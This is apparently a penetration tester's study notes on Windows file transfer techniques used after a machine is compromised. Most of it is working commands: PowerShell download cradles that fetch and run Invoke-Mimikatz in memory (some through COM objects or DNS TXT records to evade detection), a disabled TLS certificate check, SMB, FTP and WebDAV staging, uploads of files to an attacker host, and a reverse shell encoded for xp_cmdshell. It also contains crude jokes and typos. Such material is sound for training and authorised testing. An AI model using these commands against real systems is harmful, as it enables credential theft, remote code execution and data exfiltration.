# Windows File Transfers

- Windows Astaroth Attack

This is a fileless distribution technique that runs in memory to hide it's activities from security solutions and abuses legitimate Windows software features to spread quietly.

The Microsoft Defender ATP Research Team noted a spike in the use of the Windows Management Instrumentation Command Line Tool (WMIC) to run scripts, which indicate a fileless technique being used. This attack typically starts through spam emails with malicious URLs to a LNK file shortcut. If the file is clicked, WMIC is run and allows the download and execution of JavaScript code. The code in turn abuses the Bitsadmin tool to download it's payloads and the eventual end payload is Astaroth.

## PowerShell Base64 Encode & Decode

- Check that file is correct.
```bash
lemur@htb ~$ md5sum id_rsa # Yup, we're good :thumbsup:
lemur@htb ~$ cat id_rsa | base64 -w 0; echo

PS: 
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", 
[Convert]::FromeBase64String("JDFUIAH387Q987FUH384092==")
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

Windows Command Line Utility (cmd.exe) has a maximum string length of 8191 characters. Also, a web shell may error if you attenpt to send extremely large strings.

## PowerShell Web Downloads

In any version of PowerShell, the `System.Net.WebClient` class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data:


- OpenRead : Returns the data from a resource as a Stream

- OpenReadAsync : 
   Returns the data from a resource 
   without blocking the calling thread

- DownloadData : Downloads data from a resource and returns a Byte array

- DownloadDataAsync : 
   Downloads data from a resource and returns a Byte array 
   without blocking the calling thread

- DownloadFile : Downloads data from a resource to a local file

- DownloadFileAsync : 
   Downloads data form a resource to a local file 
   without blocking the calling thread

- DownloadString : Downloads a String from a resource and returns that string

- DownloadStringAsync : 
   Downloads a String from a resource 
   without blocking the calling thread

```bash
PS:
(New-Object Net.WebClient).DownloadFile('<target_url>','<output_filename>')
(New-Object Net.WebClient).DownloadFileAsync('<target_url>','<output_filename>')
```

- Invoke-Expression (execute in memory)

```bash
PS:
IEX (New-Object Net.WebClient).DownloadString('
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1')

(New-Object Net.Webclient).DownloadString('
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1') | IEX
```

- Invoke-WebRequest

```bash
PS:
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerView 
-OutFile PowerView.ps1
```

- Cradles

```bash
# normal download cradle
IEX (New-Object Net.Webclient).downloadstring("
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1")

# PowerShell 3.0+
IEX (iwr 'https://raw.githubusercontent.com/Invoke-Mimikatz.ps1')

# hidden IE com object ((( BLOCKED )))
$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1');start-sleep -s 5;

$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r

# Msxml2.XMLHTTP COM object (( Accepted ))
$h=New-Object -comobject Msxml2.XMLHTTP;$h.open('GET','
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1',$false);$h.send();

iex $h.responseText

# WinHttp COM object (not proxy aware) ((( Doesn't play well with Linux Server )))
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','
   https://raw.githubusercontent.com/Invoke-Mimikatz.ps1',$false);$h.send();

iex $h.responseText

# using bitstransfer- touch disk
Import-Module bitstransfer;Start-BitsTransfer '
https://raw.githubusercontent.com/Invoke-Mimikatz.ps1' $env:temp\t;

$r=gc $env:temp\t;rm $env:temp\t; iex $r

# DNS TXT approach from PowerBreach (https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerBreach/PowerBreach.ps1)

# Code to execute needs to be a base64 encoded string stored in a TXT record
# Remember to purchase Google domain lmao

IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup 
   -querytype=txt "SERVER" | Select -Pattern '"*"') -split '"'[0]))))

# from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d
<#
<?xml version="1.0"?>
<command>
   <a>
      <execute>Get-Process</execute>
   </a>
  </command>
#>
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")

$a.command.a.execute | iex
```

- Simple Python3 GUI server:

```py
#!/usr/bin/env python3

import sys
import http.server
import socketserver

port = int(sys.argv[1])
handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", port), handler) as httpd:
	print("[+] Serving on port ", port)
	httpd.serve_forever()

```

## Common Errors with PowerShell

There may be cases when the Internet Explorer first-launch configuration 
has not been completed, which prevents the download. 

This can be bypassed using the parameter `-UseBasicParsing`:

```bash
PS C:\> IWR https://<url>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorers first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.

PS C:\> Invoke-WebRequest https://<url>/PowerView.ps1 -UseBasicParsing | IEX

			# np bruh ~<3

```

Another error in PowerShell downloads is releated to the SSL/TLS secure channel 
If the cert is not trusted we can bypass it with the following command:

```bash
PS:
IEX(New-Object Net.WebClient).DownloadString('https://<url>/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): 
"The underlying connection was closed: 
Could not establish trust relationship for the SSL/TLS secure channel."

PS:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```

## SMB Downloads

Create the SMB Server:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- New verisons of Windows block unauthenticated guest access however:

```
C:\ copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC form unsafe or malicious devices on the network.

```

- Set a username and password using our Impacket SMB server and mount the SMB server on our Windows target machine:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

C:\ net use n: \\192.168.220.133\share /user:test test
```

- Mount the SMB server if you receive and error using `copy filename\\IP\sharename`

## FTP Downloads

We can configure an FTP Server in our attack host using `Python3 pyftpdlib` module. It can be installed with pip.

Then we can specify port 21 because, by default, pyftpdlib uses port 2121. 
Anonymous authentication is enabled by default if we don't set a username and password:

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

(New-Object Net.Webclient).DownloadFile('ftp://192.168.10.122/file.txt', 'ftp-file.txt')
```

When we get a shell on a remote machine, we may not have interactivity. 
If that's the case, we can create an almost script-like file to download the files we want. 

First, we need to create a file containing the commands needed to execute and then use the FTP client to use that file to download the file... File-ception:

```
C:

echo open 192.168.10.122 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt

ftp -v -n -s:ftpcommand.txt

ftp> 
open 192.168.10.122
USER anonymous

GET file.txt
bye

more file.txt
Hello, this is a file. Fuck y'all. Windows ftp ftw 

```

## Upload Operations - Windows file transfer methods

One of the easiest ways is with the PowerShell Base64 Encode & Decode method. 
Let's see how we can accomplish this with a few other examples:

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Now we can use a PowerShell script `PSUpload.ps1` which uses `Invoke-WebRequest` 
to perform the upload operations. The script accepts two parameters `-File` 
which we use to specify the path and `-Uri`, 
the server URL where we'll upload our file. 

Let's attempt to upload the host file from our Windows host:

```bash
PS:
IEX(New-Object Net.WebClient).DownloadString('https://raw.github.com/PSUpload.ps1')
Invoke-FileUpload -Uri https://192.168.10.122:8000/upload -File C:\TwoGuysKissing.png
```

## PowerShell Base64 Web Upload

Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. we use Netcat to listen in on a port we specify and send the file as a POST request. 

Finally, we copy the output and use the base64 decode function to convert the base64 string into a file:

```bash
PS: 
$b64 = [System.convert]::ToBase64String((
   Get-Content -Path 'C:\Windows\HandomeManEatingAss.png' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.10.122:8000/ -Method POST -Body $b64


lemur@htb ~ $ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.10.122] from (UNKNOWN) [192.168.10.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...

echo <base64> | base64 -d -w 0 > kittens.png
```

## SMB Uploads

Companies usually allow outbound traffic using HTTP and HTTPS protocols. 
Commonly enterprises don't aloow the SMB protocol (TCP/445) out of their internal network
because this can open them up to potential attacks. 

For more information on this, we can read the Microsoft post: 
`Preventing SMB traffic from lateral connections and entering or leavin the network`
https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a

An alternative is to run SMB over HTTP with `WEbDav.WebDAV` (RFC 4918) 

It's an extension of HTTP, the internet protocol that web browsers 
and web servers use to communicate with each other. 

The WebDAV protocol enables a webserver to behave like a fileserver, 
supporting collaborative content authoring. WebDAV can also use HTTPS.

When you use SMB, it will first attempt to connect using the SMB protocol, 
and if there's not SMB share available, it will try to connect using HTTP.

To set up our WebDAV server, we need to install two Python modules: 
`wsgidav` and `cheeroot`. 


```bash
sudo pip install wsgidav cheeroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

C: 
dir \\192.168.10.122\DavWWWRoot


 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free

```

Note that DavWWWRoot is a special keyword recognized by the Windows Shell. 
No such folder exists on your WebDAV server. 

The DavWWWRoot keyword tells the Mini-Redirector driver, 
which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to it. For example: \\192.168.10.122\sharefolder-1

```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder-1\
```

Note if there are no SMB (TCP/445) restrictions, you can just use impacket's smbserver 
the same way we set it up for download operations.

## FTP Uploads

```bash
sudo python3 -m pyftpdlib --port 21 --write

PS:
(New-Object Net.WebClient).UploadFile('
   ftp://192.168.10.122/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

 We could use the cmd.exe command-file that we made and example of earlier.
 
 ## Convert ps1 shell 
 ```bash
 cat reverse_shell.ps1 | iconv -t UTF-16LE
 
 Using SQL in Windows:
 xp_cmdshell powershell -enc ...SNIP-ICONV...
 ```
 *Windows formatting
